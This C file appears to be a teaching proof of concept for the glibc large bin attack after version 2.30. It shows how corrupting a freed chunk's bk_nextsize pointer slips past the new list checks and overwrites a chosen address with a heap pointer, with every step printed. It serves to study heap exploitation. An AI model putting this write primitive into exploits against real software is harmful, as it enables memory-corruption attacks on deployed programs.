#include<stdio.h>
#include<stdlib.h>

/*

A revisit to large bin attack for after glibc2.30

Relevant code snippet :

	if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
		fwd = bck;
		bck = bck->bk;
		victim->fd_nextsize = fwd->fd;
		victim->bk_nextsize = fwd->fd->bk_nextsize;
		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
	}


*/

int main(){
  /*Disable IO buffering to prevent stream from interfering with heap*/
  setvbuf(stdin,NULL,_IONBF,0);
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  fprintf(stderr, "\n\n");
  fprintf(stderr, "Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n");
  fprintf(stderr, "Check 1 : \n");
  fprintf(stderr, ">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
  fprintf(stderr, ">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
  fprintf(stderr, "Check 2 : \n");
  fprintf(stderr, ">    if (bck->fd != fwd)\n");
  fprintf(stderr, ">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
  fprintf(stderr, "This prevents the traditional large bin attack\n");
  fprintf(stderr, "However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n");
  
  fprintf(stderr, "====================================================================\n\n");

  size_t target = 0;
  fprintf(stderr, "Here is the target we want to overwrite (%p) : %llu\n\n",&target,target);
  size_t *p1 = malloc(0x428);
  fprintf(stderr, "First, we allocate a large chunk [p1] (%p)\n",p1-2);
  size_t *g1 = malloc(0x18);
  fprintf(stderr, "And another chunk to prevent consolidate\n");

  fprintf(stderr, "\n");

  size_t *p2 = malloc(0x418);
  fprintf(stderr, "We also allocate a second large chunk [p2]  (%p).\n",p2-2);
  fprintf(stderr, "This chunk should be smaller than [p1] and belong to the same large bin.\n");
  size_t *g2 = malloc(0x18);
  fprintf(stderr, "Once again, allocate a guard chunk to prevent consolidate\n");

  fprintf(stderr, "\n");

  free(p1);
  fprintf(stderr, "Free the larger of the two --> [p1] (%p)\n",p1-2);
  size_t *g3 = malloc(0x438);
  fprintf(stderr, "Allocate a chunk larger than [p1] to insert [p1] into large bin\n");

  fprintf(stderr, "\n");

  free(p2);
  fprintf(stderr, "Free the smaller of the two --> [p2] (%p)\n",p2-2);
  fprintf(stderr, "At this point, we have one chunk in large bin [p1] (%p),\n",p1-2);
  fprintf(stderr, "               and one chunk in unsorted bin [p2] (%p)\n",p2-2);

  fprintf(stderr, "\n");

  p1[3] = (size_t)((&target)-4);
  fprintf(stderr, "Now modify the p1->bk_nextsize to [target-0x20] (%p)\n",(&target)-4);

  fprintf(stderr, "\n");

  size_t *g4 = malloc(0x438);
  fprintf(stderr, "Finally, allocate another chunk larger than [p2] to place [p2] into large bin\n");
  fprintf(stderr, "Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
  fprintf(stderr, "  the modified p1->bk_nextsize does not trigger any error\n");
  fprintf(stderr, "Upon inserting [p2] into largebin, [p1]->bk_nextsize->fd->nexsize is overwritten to address of [p2]\n");

  fprintf(stderr, "\n");

  fprintf(stderr, "In out case here, target is now overwritten to address of [p2]\n",target);
  fprintf(stderr, "Target (%p) : %p\n",&target,(size_t*)target);

  fprintf(stderr, "\n");
  fprintf(stderr, "====================================================================\n\n");

  return 0;
}
